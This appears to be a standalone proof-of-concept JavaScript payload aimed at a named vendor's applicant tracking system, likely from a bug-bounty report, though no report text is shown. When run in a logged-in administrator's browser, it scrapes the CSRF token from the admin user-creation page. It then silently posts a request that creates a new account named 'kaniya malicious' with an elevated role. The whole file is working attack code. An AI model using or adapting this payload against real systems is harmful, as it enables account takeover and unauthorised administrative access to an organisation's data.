function readBody(xhr) {
    var data;
    if (!xhr.responseType || xhr.responseType === "text") {
        data = xhr.responseText;
    } else if (xhr.responseType === "document") {
        data = xhr.responseXML;
    } else {
        data = xhr.response;
    }
    var parser = new DOMParser();
    var resp = parser.parseFromString(data, "text/html");
    token = resp.getElementsByName('_csrf')[0].content; 
    csrf(token);
    return data;
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
        response = readBody(xhr);
    }
}
xhr.open('GET', 'https://ats-demo.paycor.com/admin/users/create-user', true);
xhr.send(null);


function csrf(token) {

fetch('https://ats-demo.paycor.com/api/User_create.action', {
    method: 'POST',
    headers: {
        'Content-Length': '346',
        'Accept': 'application/json, text/plain, */*',
        'X-Csrf-Token': token,
        'Sec-Ch-Ua-Mobile': '?0',
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://ats-demo.paycor.com/admin/users/create-user',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close'
    },
    credentials: 'include',
    body: 'clientId=8a79818b77db8dd50177efebe222018e&allowJobApproval=false&allowOfferApproval=false&authzedCompanyNotLocked=true&authzedCompanyEnabled=true&firstName=kaniya&lastName=malicious&emailId=kaniya%40test.com&phoneNo=&mobileNo=&title=&departmentsList=&roleId=31&customPermissions=&keyContact=false&isRoleChanged=true&sendPasswordEmail=true'
});

}
